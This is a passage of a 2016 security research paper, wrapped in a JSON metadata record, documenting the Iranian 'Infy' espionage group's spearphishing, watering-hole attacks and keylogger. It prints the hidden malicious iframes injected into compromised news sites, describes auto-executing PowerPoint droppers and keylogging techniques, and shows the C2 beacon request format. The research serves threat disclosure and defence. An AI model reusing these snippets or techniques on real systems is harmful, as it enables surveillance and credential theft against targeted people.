{
    "id": "1942f787-e3f8-433a-8843-444e1f7c73ee",
    "created_at": "2022-10-25T16:48:14.371122Z",
    "updated_at": "2025-03-27T02:17:05.749561Z",
    "deleted_at": null,
    "sha1_hash": "12503011cfce27ed282658baa893fa8791d27965",
    "title": "",
    "authors": "",
    "file_creation_date": "0001-01-01T00:00:00Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 2551438,
    "plain_text": "# Iran and the Soft War for Internet Dominance\n\nClaudio Guarnieri & Collin Anderson 1\n\nBlack Hat USA, August 2016\n\n## Table of Contents\n\nIntroduction\nCampaigns and Actors\n\nInfy\nCleaver (Ghambar​ )​\nRocket Kitten\nSima\nEnd Note\nAcknowledgements\nAppendix\n\n## Summary\n\nOver the past decade, the Islamic Republic of Iran has been targeted by continual intrusion campaigns\nfrom foreign actors that sought access to the country's nuclear facilities, economic infrastructure, military\napparatus, and governmental institutions for the purpose of espionage and coercive diplomacy.\nConcomitantly, since the propagandic defacements of international communications platforms and\npolitical dissident sites conducted by an organization describing itself as the \"Iranian Cyber Army\"\nbeginning in late 2009, Iranian actors have been attributed in campaigns of intrusions and disruptions of\nprivate companies, foreign government entities, domestic opposition, regional adversaries and\ninternational critics. While Iran maintains strong technical universities and an extraordinarily active 2\n\ndefacement community, the country has not invested in its capacity for Internet­based espionage to the 3\n\nsame degree as its traditional geopolitical rivals, and is less able to seek capabilities abroad from\n\n1 Contact: Claudio (nex@nex.sx, PGP: 7359 D880) and Collin (cda@asc.upenn.edu, PGP: FAFB F2FA)\n2 Sharif University of Technology for example is an internationally recognized engineering school.\nhttps://www.timeshighereducation.com/world­university­rankings/sharif­university­of­technology\n3 Ashiyane Digital Security Team and other defacement groups have commonly held positions in the leaderboard of\nZone­H and are attributed with thousands of defacements. http://www.zone­h.org/stats/notifierspecial\n\n\n-----\n\ncompanies such as Hacking Team or Finfisher due to its pariah status. As a result, the computer network\noperations attributed to Iranian actors provide insight into the behavior of a country under scrutiny due to\nits conflictual relationships with regional adversaries, and may reflect the general trajectory of other\ncountries seeking to use the espionage on modern communications technologies to pursue their own\ngeopolitical interests.\n\nCivil society and political opponents are a primary target of Iranian intrusion campaigns, which gives rise\nto the motivation and basis for our research into the ecosystems and threats originating from the country.\nThis document serves an initial technical overview in complement to a forthcoming publication from the\nCarnegie Endowment for International Peace on Iran­based computer network operations, and is intended\nto provide the following:\n\n  - first accounting of a new threat actor targeting interests aligned with the Iranian state;\n\n  - additional research on the activities of the Infy group, which supports and extends accounts of the\ngroup's activities recently disclosed elsewhere;\n\n  - documentation of new developments in the malware and activities believed to be connected to\nknown threat actors Rocket Kitten and Operation Cleaver; and,\n\n  - descriptions of tactics by known actors in response to political events inside of Iran and changes\nthe use of personal communications tools by the public, namely the mass adoption of Telegram.\n\nOur research incurs classic issues applicable to all reports on intrusion campaigns, primarily questions of\nattribution and intent. The end objective of particular CNO activities is not always discernable based on\nthe tactics used or the data accessed, as the end implications of the disclosure of particular information is\noften distant and concealed from even the target. Where such intent is made evident, the reasons for\nIranian intrusion campaigns range from retaliatory campaigns against adversaries, as a result of\nidentifiable grievances, to surveillance of domestic opposition in support of the Islamic Republic\nestablishment. Iranian intrusion sets appear to be interested in a broad field of challenges to the political\nand religious hegemony of the Islamic Republic. Previous reports on Iranian campaigns have referred to\nthe targeting of Iranian dissidents, however, in practice those targeted range from reformists operating\nwithin the establishment from inside of Iran to violent extremist organizations outside. Therefore, Iranian\nCNO activities should be considered as a tool in the context broader state activities and policies, including\noffline events.\n\nFor the purpose of organization, this document is divided based on the actor group that we believe to be\nresponsible for the tools, incidents, and activities under discussion. We also attempt to blend the context\nand history of incidents with the technical specificities in each section, broken out into different\nsubsections. In order to avoid further expansion of this document, we momentarily defer to previous\nreports for context about groups, with the intention of extending this background narrative later. In\npractice, the distinction relied upon is artificial, as the boundaries between groups at times appears less\nclear, and tactics have evolved rapidly in response to external pressure. For example, in past reports that\nhave identified Iranian malware such as Madi, Stealer, and Sayyad, these families of agents appear to fall\ninto disuse within a short period of their discovery and public attribution to Iranian entities. Such\ndiscontinuity, and the opacity even within activities published on, has further reinforced the difficulty in\n\n2\n\n\n-----\n\nconstructing a cogent narrative of specific threat groups. This aspect of the ecosystem is not in scope here,\nand we focus instead on technical documentation, and will revisit the context in our forthcoming research.\n\nFinally, this document is intended to be the first release in a set of continuing disclosures, and should be\nconsidered a living resource; subject to revision, reconsideration and provided with the promise of\nexpansion.\n\nResearch: https://iranthreats.github.io ​\n\n## Introduction\n\nOver the course of three years of observation of campaigns targeting civil society and human rights\norganizations, from records of well over two hundred spearphishing and other intrusion attempts against\nindividuals inside of Iran and in the diaspora, a narrative of persistent intrusion efforts emerges. From\nMadi onward, Iranian threat actors maintain a consistent set of interests and activities that blur the lines\nbetween domestic surveillance and foreign commercial espionage. This pattern continues across\nsubsequent groups. Infy​ engaged in malware spearphishing against the same targets as Flying Kitten from ​\nthe outset of its campaign; Operation Cleaver has registered several resources related to development\nagencies that have been the subject of intrusion attempts by others since February 2014. This\ndocumentation provides new insight into intrusion efforts conducted by at least four discrete Iranian threat\nactors, Rocket Kitten, Infy, Sima, and Operation Cleaver, including groups and tools that have not been\npreviously disclosed.\n\nAttribution of different Iranian intrusion efforts has been made possible through the reuse of common\ntemplates and infrastructure over long periods of time, coupled with failures in operational security that\nexposed information on the actors behind the campaigns. These approaches are imperfect, as the\nparticipants often attempt to break patterns after publicity has called attention to their activities and\nprovided critical external feedback on their strategies. No collected documentation demonstrates the\nprocess of selecting targets or coordinating campaigns, however, many of those targeted would be later\nsingled out by other actors, and their targeting aligns with Iran’s political environment. The intrusion sets\ndocumented have clear indications of being solely Iranians inside of Iran, with little indication of\nparticipation from Iranians in the diaspora or support from non­Iranians. At the most basic level, the\ngroups of actors follow similar patterns of life approximating that of an Iranian workday (Saturday\nthrough Wednesday) and are fully dormant on Iranian holidays, particularly the long vacation period of\nNowruz.\n\nBased on our longitudinal account of infrastructure employed in intrusion attempts against civil society,\nwe find that the activities of Iranian actors date back further than previously documented and cover a\nricher set of targets. Iranian threat actors have responded to improved information security practices\namongst its target populations and increased pressure resulting from publication of their activities. The\nSima and Operation Cleaver groups represent the most sophisticated spearphishing campaigns observed\nfrom Iran thus far, using open mail relays to send professionally­tailored messages based on monitoring\n\n3\n\n\n-----\n\nof target interests and emotional manipulation, such as stark threats of immigration issues as the\nDepartment of Homeland Security. While such campaigns may not represent Iran’s graduation to a first or\nsecond tier power, these incidents impact livelihoods, and their documentation provides tactics of public\naccountability. The study of these properties and the similarities between actors lends an insight into the\ncapabilities and interests of Iranian intrusion sets, and their foreshadows future activities.\n\n## Campaigns and Actors 4\n\n### Infy\n\n#### Introduction\n\nSince early 2013,​ we have observed activity from a unique threat actor group, which we began to ​\ninvestigate based on increased activities against human right activists in the beginning of 2015. In line 5\n\nwith other research on the campaign, released prior to publication of this document, we have adopted the\nname “Infy”, which is based on labels used in the infrastructure and its two families of malware agents.\n\nThanks to information we have been able to collect during the course of our research, such as\ncharacteristics of the group’s malware and development cycle, our research strongly supports the claim\nthat the Infy group is of Iranian origin and potentially connected to the Iranian state. Amongst a backdrop\nof other incidents, Infy became one of the most frequently observed agents for attempted malware attacks\nagainst Iranian civil society beginning in late 2014, growing in use up to the February 2016 parliamentary\nelection in Iran. After the conclusion of the parliamentary election, the rate of attempted intrusions and\nnew compromises through the Infy agent slowed, but did not end. The trends witnessed in reports from\nrecipients are reinforced through telemetry provided by design failures in more recent versions of the Infy\nmalware.\n\n4 _NB​_ : Historically, naming schemas on Iranian actors have been challenging, even when researchers are acquainted ​\nwith the cultural, linguistic and political context of the country. For example, while Madi was linked with the Shi’a\nbelief in the Twelfth Imam, Mahdi is also a common name, which arises elsewhere in several samples alongside\nother Persian names or words (“Motahare.txt”). Similarly, while “Gholee” was linked to a minor musician in one\nreport, the reference could have as easily been a code comment in Persian relevant to its functionalities (from\ntransliterated Persian, “peak”). Where we find names embedded in samples from project resources, they are often\nless than inspiring, such as “ExtremeDownloader” or “Stealer.” The approach of using unique strings still seems\nmore preferable than generic references to Iran, so where possible, our naming convention relies on unique\nidentifiers that originate from malware agents and infrastructure that are sufficiently distinctive, while attempting to\navoid sensationalism or stereotypes.\n5 After the drafting of this paper was completed, California­based security vendor Palo Alto Networks published\ntwo blog posts that includes information on this same campaign. Similarly, the Helios Team at 360 SkyEye Labs has\ndocumented some of the activities of Infy under Operation Mermaid. While these reports often have commonalities\nand overlaps, they all offer differing and complementary perspectives into the campaign.\n[http://researchcenter.paloaltonetworks.com/2016/05/prince­of­persia­infy­malware­active­in­decade­of­targeted­atta](http://researchcenter.paloaltonetworks.com/2016/05/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks/)\n[cks/](http://researchcenter.paloaltonetworks.com/2016/05/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks/)\n[http://researchcenter.paloaltonetworks.com/2016/06/unit42­prince­of­persia­game­over/](http://researchcenter.paloaltonetworks.com/2016/06/unit42-prince-of-persia-game-over/)\n[https://ti.360.com/upload/report/file/mryxdgkb20160707en.pdf](https://ti.360.com/upload/report/file/mryxdgkb20160707en.pdf)\n\n4\n\n\n-----\n\nPalo Alto Networks has noted and described the differences of two malware agents developed in parallel,\nwith commonalities in behavior but differing functionalities; families described as Infy and Infy M. Our\nprimary observation was of the Infy (non­M) malware, which primarily functions as a keylogger for the\ncollection of account credentials. Until the publication of the Palo Alto report, the developers of the Infy\nappeared to be actively updating and maintaining the codebase, and new releases were distributed to\nexisting, as well as new, targets quite regularly. At the time of writing, the latest Infy keylogger was\nversion 00031, which appears to have been interrupted by public disclosure before it reached wide\ndeployment, with our first collected samples appearing in May 2013. Other samples were found bearing a\ncompilation time as early as June 2012 and version 00002. Similar to the increase prior parliamentary\nelection, these first samples appeared coinciding with Iran’s Presidential election – then a critical moment\ndue to being the first Presidential election since the highly­contested Green Movement.\n\nOur analysis indicates that the Infy malware agents have been employed for compromising targets\npertinent to the internal security interests of the Iranian government since at least July 2010. Infy is\nevidently an intrusion operation that has been running for several years, even continuing on in some form\nsince the publication of the activities, with new agents found from late June 2016.\n\n#### History and Tactics\n\nPrior to the June 2013 Presidential election, staff members of BBC Persian and other Persian­language\nsatellite television networks received a series of files purporting to be statements from political opposition\ngroups inside of the country. One message claimed to be from Mohammad Taghi Karroubi, the son of 6\n\nreformist politician Mehdi Karroubi who ran for presidency in the 2009 elections and has been under\nhouse arrest since February 2011 (25 Bahman). The document discusses the disqualification of former\nPresident Hashemi Rafsanjani from the elections, the role of the Guardian Council in the vetting of\ncandidates, and whether reformists should vote. The original source of this document is unclear. The text\nalso does not appear to have been publicly­available, and may have been falsely attributed to Mohammad\nTaghi.\n\nAs the election neared, successive documents with the filenames of “Statement” and “Alliance” in 7 8\n\nPersian were sent from the same Gmail address to a widening set of media figures outside of Iran, such 9\n\nas Nima Akbarpour and Nikahang Kowsar, and social network users supporting reformist figures.  10 11 12\n\n6 entekhabat.rar ­ fe57d408252af3c0fe776b34e838ac98 ​\n7 bayaniehcod.rar ­ dd0332049dc3fad6b81b3b2e036af718\n8 etelaf.rar ­ 55cb9a6e01e8b5e28633020e95a0a8e4 ​\n9 [https://www.facebook.com/Admin.ComNews/posts/10151468451866274?fref=nf​](https://www.facebook.com/Admin.ComNews/posts/10151468451866274?fref=nf)\n10 [https://plus.google.com/%2BNimaAkbarpour/posts/SMP1VYTaA1M​](https://plus.google.com/+NimaAkbarpour/posts/SMP1VYTaA1M)\n11 [https://www.facebook.com/nikowsar/posts/261690493970257​](https://www.facebook.com/nikowsar/posts/261690493970257)\n12 [https://plus.google.com/+HamedMousavi/posts/Xe37MyYBePm​](https://plus.google.com/+HamedMousavi/posts/Xe37MyYBePm)\n\n5\n\n\n-----\n\n|Col1|Col2|\n|---|---|\n\n\nWhile the defacements and mass phishing events, conducted by other groups in parallel to the malware\nemails, waned after the elections, the intrusion attempts from the Infy malware group did not. The culprits\nbehind the campaign expanded tactics, sending malware embedded in PowerPoint presentations topical to\nevents in Iran, such as “Iran’s Nuclear Power!”, and impersonating others to leverage social trust. Over 13\n\nthe months following the elections, the accounts of Iranians that had been compromised by the actors\nwere then used for spreading the malware. The personal email of an employee of VOA’s Persian News\nNetwork was used to send the Infy malware to other journalists, attached as files named “Visual”\n(didani.pps) and “Invitation Card.” Shortly after, in August 2013, a typographic email address claiming 14\n\nto be a reformist activist and journalist was used to approach a Persian­language broadcaster and a Green\nMovement supporter, with malware samples embedded in content related to poverty. Similarly, a\nimposture account posing as an Iranian professor of political science and media commentator was used to\napproach a BBC Persian presenter and others in the following year.\n\nOur observation of Infy’s campaigns, primarily through the lens of spearphishing attacks against Iranian\ncivil society and media organizations, indicates a wandering focus on particular demographics on a\nstrategic basis over time. When activities targeting of civil society subsided, the actors instead appeared to\nhave focused on external targets, such a series of attempts to spearphish the Danish Ministry of Foreign\nAffairs. The Infy malware was seen targeting Iranians again in June 2015, when it was shared with 15\n\nresearchers after being sent to a broadcast journalist at BBC Persian with a generic introduction and a\nPowerPoint presentation attached titled “Nostalogy” (sic). 16\n\nBased on samples and observations of spearphishing attempts, it appears that during this time there was\nan evolution in Infy’s infrastructure and tactics, connected with renewed attempts at surveillance of\ndiaspora organizations. Based on information collected in the course of this research, the targets and\nvictims of Infy’s campaigns have continued to be strongly aligned with Iran’s “soft war” agenda, internal\nsecurity policies, and regional adversaries of the hardline establishment of the Islamic Republic of Iran.\nThe trends align with campaigns concurrently conducted by other known Iranian intrusion sets, even to\nthe extent of overlapping intrusion attempts and shared successful compromises of targets.\n\n13 nuclear_power.pps ­ 463205b5ddd3437f1af559ead6a750e3 ​\n14 ﮐﺎﺭﺕ ﺩﻋﻮﺕ.pps ­ ​ f2eb7c2d886ae970e477307f1433f33c ​\n15 Rapport om APT­angreb mod Udenrigsministeriet, Center for Cybersikkerhed.\n[https://fe­ddis.dk/cfcs/CFCSDocuments/Phishing%20uden%20fangst.pdf](https://fe-ddis.dk/cfcs/CFCSDocuments/Phishing%20uden%20fangst.pdf)\n16 nostalogy.pps ­ 501e2bdc7d77da15ae2b48eb5c49bc1d ​\n\n6\n\n\n-----\n\nUntil late December 2015, in nearly every Infy message documented since our tracking began in May\n2013, no attempt included strong tailoring of the approach, often not even including an email body,\ninstead relying on cryptic filenames and email subjects to attract interest. That December marked a\nmeaningful departure from this pattern, as the culprits began to add more descriptive information to their\nattempts, addressing topical issues and catering to the interests of the target. As in the past, these\nmessages have been sent accounts believed to be fake and accounts compromised by Infy, including\nKurdish activists that had previously been compromised by the Flying Kitten actor group.  17\n\nThe targets and timing of this shift aligns with increased attention to the political environment in the lead\nup to the February 2016 Parliamentary Election. One narrowly­targeted spearphishing from Infy was sent\nfrom the compromised account of a political activist promoting participation inside of Iran, claiming to be\na set of images of a British­Iranian dual national that has been held in Evin Prison for five years on\nespionage charges. These message have also encouraged their targets to share the documents to other 18\n\nhuman rights organizations and media outlets, in the hopes of further increasing their potential reach.\nThese improved pretexting tactics are well connected to the press cycle. Within days of the mass\ndisqualification of reformist parliamentary candidates by the Guardian Council, one message claimed to\ncover opposition protests; another, purported to contain Hassan Khomeini’s reaction to the rejection of his\nreligious credentials in his attempted candidacy for the Assembly of Experts.\n\nRe: FREE KAMAL FOROUGHI Re: FREE KAMAL FOROUGHI\n\nHello, ﺳﻼﻡ\nHere's the campaign of Free Kamal Foroughi. ﮐﻤﭙﻴﻦ ﮐﻤﺎﻝ ﻓﺮﻭﻏﯽ ﺭﺍ ﺁﺯﺍﺩ ﮐﻨﻴﺪ\nImages of political prisoner Kamal Foroughi at ﺯﻧﺪﺍﻥ ﺍﻭﻳﻦ209 ﺗﺼﺎﻭﻳﺮ ﺯﻧﺪﺍﻧﯽ ﺳﻴﺎﺳﯽ ﮐﻤﺎﻝ ﻓﺮﻭﻏﯽ ﺩﺭ ﺑﻨﺪ\nWard 209 of Evin Prison. ﺟﻬﺖ ﺍﻧﺘﺸﺎﺭ\nFor publication.\n\n#### Watering Hole\n\nContact information and infrastructure used in the operations of the Infy group implicate a broader set of\ndomains than those directly used in command and control operations with the agent. These domains\ncommonly reflect a naming schema related to blogging and visitor analytics (e.g. “bestwebstat.com”).\nBased on live and archived examples of such tactics, a subset of the Infy group’s domains appear to have\nbeen used in order to stage watering hole attacks against ethnic minority populations and militant\norganizations over the course of at least five years.\n\nOur earliest observed watering hole incident, occurring in July 2010, involved intrusions into the “Taftaan\nNews Agency” and “Jonbesh­e Moqavemat­e Mardomi­e Iran” blogs, sites associated with the\nBalochistan­based Jundallah – a militant movement internationally recognized as a terrorist organization.\n\n19 Shortly after the suspected time of intrusion, at least one target had warned its visitors that an old email\n\n17 [https://www.fireeye.com/content/dam/fireeye­www/global/en/current­threats/pdfs/rpt­operation­saffron­rose.pdf​](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-operation-saffron-rose.pdf)\n18 [http://freekamalforoughi.com​](http://freekamalforoughi.com/)\n19 [https://web.archive.org/web/20110830125243/http://taptan313.blogspot.com/​](https://web.archive.org/web/20110830125243/http://taptan313.blogspot.com/)\n[https://web.archive.org/web/20100819184243/http://www.junbish.blogspot.com/](https://web.archive.org/web/20100819184243/http://www.junbish.blogspot.com/)\n\n7\n\n|Re: FREE KAMAL FOROUGHI Hello, Here's the campaign of Free Kamal Foroughi. Images of political prisoner Kamal Foroughi at Ward 209 of Evin Prison. For publication.|Re: FREE KAMAL FOROUGHI ﻡﻼﺳ ﺪﻴﻨﮐ ﺩﺍﺯﺁ ﺍﺭ ﯽﻏﻭﺮﻓ ﻝﺎﻤﮐ ﻦﻴﭙﻤﮐ ﻦﻳﻭﺍ ﻥﺍﺪﻧﺯ 209 ﺪﻨﺑ ﺭﺩ ﯽﻏﻭﺮﻓ ﻝﺎﻤﮐ ﯽﺳﺎﻴﺳ ﯽﻧﺍﺪﻧﺯ ﺮﻳﻭﺎﺼﺗ ﺭﺎﺸﺘﻧﺍ ﺖﻬﺟ|\n|---|---|\n\n\n-----\n\naddress connected to the site had been compromised by actors it claimed was associated with Iranian\nintelligence agencies and then used to target others in the community. The following day, the\nadministrators noted technical issues as a result of these attacks in a post announcing the closure of the\nsite. The actors behind the incidents gained access to pertinent sites, and embedded a hidden iframe in 20\n\nthe target page claiming to be a “Stat Counter” in order to disguise the intention of the malicious code.\nThe malicious iframe appears to have used well­known ActiveX vulnerabilities for IE6 and IE7 (which\nwould have still been used in 2010) in order to push an early version of one of the Infy agents to visitors.\nIn addition to common infrastructure and recognizable binary names related to other Infy attacks, the\ndelivering mechanism included Persian­language comments on the functioning of the code within its\notherwise packed Javascript. 21\n\nThe use of watering hole tactics continued until at least the middle of May 2015, when a Kurdish news 22\n\nsite (Kurdistannet) was similarly compromised for the purpose of delivering the Infy M agent. The\nintrusion into the Kurdish site aligns with the organization’s documented history of targeting Kurdish\nactivists, particularly those based in Iran or of Iranian nationality.\n\n**Kurdish Site (2015)** **Jondallah Militant Organizations (2010)**\n\n<div style=\"display:none\" name=\"Stat Counter\"> <iframe frameborder='0' height='0' id='IF198'\n<iframe name=\"statModules\" width=\"0\" marginheight='0' marginwidth='1' name='IF198'\nheight=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling='no'\nscrolling=\"no\" border=\"0\" frameborder=\"0\" src='http://www.bestwebstat.com/e/nt/ifr2.php'\nsrc=\"http://wpstat.mine.bz/e1/stat1.php\"></iframe width='0'></iframe>\n\n </div>\n\n#### Victimology\n\nWhile not indicative of the full extent of other intrusion operations the Infy group might be running, as of\nMarch 31, 2016, we observed a total of ​236 unique victims distributed across ​ ​27 countries​ from solely\nversions 25 through 30 of the Infy (non­M) agent. For how this telemetry was collected, see ​A Not So\n_Clever Failover Strategy. Interestingly, the number and the nature of victims have reflected political ​_\nevents and the evolving geopolitical interests of Iran. For example, we observed new compromises\nlocated in Saudi Arabia in the fallout between the countries after the execution of a Shiite cleric and the\nMina Hajj stampede. 23\n\n20 [http://taptan313.blogspot.com/2010/07/blog­post_9301.html​](http://taptan313.blogspot.com/2010/07/blog-post_9301.html)\n[http://taptan313.blogspot.com/2010/07/blog­post_27.html](http://taptan313.blogspot.com/2010/07/blog-post_27.html)\n21 In translated Persian “jelogiri az ejraie dobare dar sorate moshahede mojadad”\n[22https://web.archive.org/web/20150522072531/http://www.kurdistannet.org/2015/index.php – Also noted by the ​](https://web.archive.org/web/20150522072531/http://www.kurdistannet.org/2015/index.php)\nHelios team.\n23 [http://www.nytimes.com/2016/01/04/world/middleeast/iran­saudi­arabia­execution­sheikh­nimr.html​](http://www.nytimes.com/2016/01/04/world/middleeast/iran-saudi-arabia-execution-sheikh-nimr.html)\n\n8\n\n|Kurdish Site (2015)|Jondallah Militant Organizations (2010)|\n|---|---|\n|<div style=\"display:none\" name=\"Stat Counter\"> <iframe name=\"statModules\" width=\"0\" height=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"no\" border=\"0\" frameborder=\"0\" src=\"http://wpstat.mine.bz/e1/stat1.php\"></iframe > </div>|<iframe frameborder='0' height='0' id='IF198' marginheight='0' marginwidth='1' name='IF198' scrolling='no' src='http://www.bestwebstat.com/e/nt/ifr2.php' width='0'></iframe>|\n\n\n-----\n\n**Infy (v. 25 ­ 31) Infections, December 2015 ­ May 2016**\n\nThe primary targets of these campaigns have consistently been Iranians inside of Iran, with ​48% of ​\nidentified intrusions connected with IP addresses located in Iran, in addition to a strong interest in Iranians\nin the diaspora, as indicated by the messages in bait files and hostnames we were able to observe. The\nattackers maintained a secondary interest in espionage against regional adversaries and neighboring states.\nThis characteristic matches previously documented CNO campaigns. As with Flying Kitten and Rocket\nKitten, the resources and personnel leveraged in Infy campaigns against domestic opponents overlap with\nespionage against perceived external threats. Moreover, the locations and discernable nature of the\ncompromised hosts align with known policy objectives of the Islamic Republic. It is worth noting that in\norder to establish a more accurate count, we had to deduplicate records from victims appearing to connect\nfrom multiple countries. Unsurprisingly, many victims located in Iran had been using VPN services,\nleading to connections from a changing set of countries that their circumvention tool had tunneled traffic\nthrough. Efforts were made to exclude circumvention tool IPs, and determine the clients that were\noriginally based in Iran despite their tunneled traffic.\n\n9\n\n\n-----\n\n**Infy (v. 25 ­ 31) Infections, December 2015 ­ May 2016**\n\nWhile the near majority of the victims are located in Iran, the remaining hosts are widely distributed\naround the world, with a higher concentration in the United States, Sweden, Germany and Iraq – locations\nwith large Iranian diasporas or regional interests. Several compromised systems maintain a clear\nrelationship to regional adversaries and foreign entities that Iran maintains an espionage interest in. At\nleast two hosts based in Israel have been compromised to date, although in one case these systems appear\nto have been associated with a person of Arabic or Persian descent. The Infy group also appears to engage\nin espionage activities against foreign governments and businesses. The actors successfully compromised\na host of an Saudi government institutions on January 17, 2016, and maintained access for at least two\nweeks. Similarly, a computer in Riyadh located on a network registered to the National Engineering\nServices and Marketing Company was compromised. Multiple systems in Pakistan and Afghanistan have\nbeen breached, including several on Afghan government networks.\n\n#### Infy Tools & Techniques\n\nIn order to initially compromise the designated targets, the attackers typically distributed\nspecifically­crafted malicious documents containing Infy through spearphishing attacks. The attackers in\nmost cases took existing PowerPoint presentations, or crafted new ones, and inserted some PE32 dropper\nas a Packager Shell Object inside the title slide. Interestingly, several of these documents expose the\noriginal file path in the attacker’s computer, showing the account name of the user who crafted the\nattacks:\n\n10\n\n\n-----\n\n|Col1|Col2|\n|---|---|\n\n\nWith the executable embedded in the presentation, by assigning an “On Previous” custom “Object\nAction” animation, it is automatically extracted to %Temp% and executed in the moment the presentation\nis launched.\n\nNormally, the victim would have to click “Ok” to a security warning dialog, before the dropper can\nproceed with its execution. Ironically, the patches introduced by Microsoft to fix the Sandworm\nvulnerabilities, have changed the security dialogs to messages that are a lot less alarming. As showed in\nthe previous picture, the attackers also tend to create multiple Packager Shell Objects, eventually\n\n11\n\n\n-----\n\ntriggered by different events, probably to increase the chance that the victims would concede into running\nthe payload.\n\n**Before patch MS14­060** **After patch MS14­060**\n\nIn more recent iterations of these malicious documents, the attackers started protecting them with a\npassword, so that they can only be open in read­only mode, making their inspection slightly harder.\n\nThe main malware artifact that we observed employed by this group is a very simple keylogger developed\nin Delphi. It is compiled in the form of a Windows DLL file that is installed by an initial dropper inside\nthe “C:\\ProgramData\\Adobe\\”​ folder (or “​ _C:\\Documents and Settings\\All Users\\Application ​_\n_Data\\Adobe\\” folder in older versions of Windows), named “​_ ​airplugin.vX.X.X.dll”, and registered in the ​\nWindows registry to be executed at startup through ​rundll32.exe​ and with the arguments “​startX /exc​”\n(where X is a digit like 1, 2 or 3, depending on the version of the malware). Before installing it\npermanently, the file is also temporarily stored with the filename pattern “​mpro.X.X.X.dll”. ​\n\nOne of the latest versions employed at the time of writing, marked as 00030, saw a change in the naming\nscheme of the files, as well as of the functions exported by the DLL. For example, the latest sample we 24\n\nobtained and utilized on mid­April 2016, is installed in the folder “​C:\\ProgramData\\CyberLink\\​” with\nname “CLMediaLibraryX.X.X.dll​ ​” and it is executed with the arguments “​mainf /rcv​”.\n\nThe Infy malware is very limited in functionality and seems to have been primarily designed to record\nkeystrokes, that are then stored in a ROT­obfuscated .dat file and later uploaded to the primary command\nand control server. While most Windows keyloggers either intercept keystrokes at kernel level or by using\neither the GetAsyncKeyState​ ​ or SetWindowsHookEx​ win32 APIs, Infy instead uses ​ ​RegisterHotKey​ to\ninstall global hotkeys on all available keys. While this is a known technique, it is relatively uncommon,\ndue to the simplicity of the alternatives previously mentioned.\n\n24 Omid Kobabi.pps ­ 0b7272dd9cf1968dea97f19f154274b8\n\n12\n\n|Before patch MS14­060|After patch MS14­060|\n|---|---|\n|||\n\n\n-----\n\nProbably in order to prioritize later inspection by the attackers, the log file highlights keystrokes that have\nbeen recorded from known browser windows (Internet Explorer, Firefox, Chrome, and Opera). It is\nplausible that the main intent of the attackers is to steal credentials for email and social media accounts, as\nwas seen amongst other Iranian actors, such as Flying Kitten.\n\nFor example:\n\n00000250 65 64 21 53 74 61 74 65 73 2a bc 0e 0b 0e 0b 66 |ed!States*.....f|\n00000260 69 72 65 66 6f 78 2f 65 78 65 3d 2b 2b 2b 49 6e |irefox/exe=+++In​ ​|\n00000270 42 72 6f 77 73 65 72 5c 5e 21 50 72 6f 62 6c 65 |Browser​ ​\\^!Proble|\n00000280 6d 21 6c 6f 61 64 69 6e 67 21 70 61 67 65 21 2e |m!loading!page!.|\n00000290 21 4d 6f 7b 69 6c 6c 61 21 46 69 72 65 66 6f 78 |!Mo{illa!Firefox|\n000002a0 3f bc bc 21 65 73 74 3d 32 34 3f 0e 0b 0e 0b 66 |?..!est=24?....f|\n000002b0 69 72 65 66 6f 78 2f 65 78 65 3d 2b 2b 2b 49 6e |irefox/exe=+++In​ ​|\n000002c0 42 72 6f 77 73 65 72 5c 68 74 74 70 3b 30 30 77 |Browser​ ​\\http;00w|\n000002d0 77 77 2f 67 6f 6f 67 6c 65 2f 63 6f 6d 30 6e 63 |ww/google/com0nc|\n000002e0 72 5e 21 4d 6f 7b 69 6c 6c 61 21 46 69 72 65 66 |r^!Mo{illa!Firef|\n\nAdditionally, the Infy malware initiates a separate Timer and it periodically invokes the\n_GetClipboardData API to copy and store the content in the same .dat log file. For example:​_\n\n00000370 0e 0b ac 4e 65 77 21 43 6c 69 70 62 6f 61 72 64 |...New!Clipboard​ ​|\n00000380 bc 0e 0b 0e 0b 0e 0b 0e 0b 65 78 70 6c 6f 72 65 |.........explore|\n00000390 72 2f 65 78 65 3d 41 63 72 6f 62 61 74 3f bc bc |r/exe=Acrobat?..|\n\nThis additional interception might have been employed to circumvent the use of password management\nsoftware, a common component of digital security trainings, that allow the users to avoid remembering\nand manually typing the passwords for logging into all the different online services they commonly\naccess.\n\n#### Network Infrastructure and Communications\n\nThe Infy malware is designed to regularly beacon back to an HTTP server controlled by the operators. At\nfirst, it performs an initial check in with the command and control to register and eventually fetch updates.\nThe URLs and the arguments used by the malware have occasionally changed, but at the time of the\nbroader infrastructure takedown this function looked like the following:\n\nGET /glp/uglp.php?cn=[COMPUTER NAME]&dn=1&ver=[VERSION\nNUMBER]&lfolder=f1&cpuid=[CPUID]&machineguid=[MACHINE GUID]&tt=[TIMESTAMP]\nHTTP/1.1\nUser­Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)\nHost: updatebox4.com\nCache­Control: no­cache\n\n13\n\n\n-----\n\nThe response from the server would appear as a page not found error:\n\nHTTP/1.1 404 Not Found\nDate: Fri, 01 Jan 2016 12:59:59 GMT\nServer: Apache\nX­Powered­By: PHP/5.3.23\nConnection: close\nTransfer­Encoding: chunked\nContent­Type: text/html\n\n144\n<!DOCTYPE HTML PUBLIC \"­//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found</h1>\n<p>The requested URL was not found on this server.</p>\n<p>Additionally, a 404 Not Found\nerror was encountered while trying to use an ErrorDocument to handle the\nrequest.</p>\n</body></html>\n\n0\n\nAfter the first beacon, and at a certain interval, the versions of Inty malware observed would then make a\nPOST request to the URL “​/glp/rglp.php”​ containing information on the system, a timestamp, and an ​\nencoded and obfuscated copy of the log file generated by the keylogger. Interestingly, the server would\nrespond with an “OK” followed by a common PHP error caused by mishandling the generation of the\nresponse, which exposes the actual file path of the script and indicates an intent attempt to modify\nheaders.\n\nHTTP/1.1 200 OK\nDate: Fri, 01 Jan 2016 13:00:02 GMT\nServer: Apache\nX­Powered­By: PHP/5.3.23\nContent­Length: 2\nConnection: close\nContent­Type: text/html\n\nOK<br />\n<b>Warning</b>: Cannot modify header information ­ headers already sent by\n(output started at /home/updatese/public_html/ro/ro.php:146) in\n<b>/home/updatese/public_html/ro/ro.php</b> on line <b>147</b><br />\n\nUnder the last observed versions of the Infy agent, the C&C 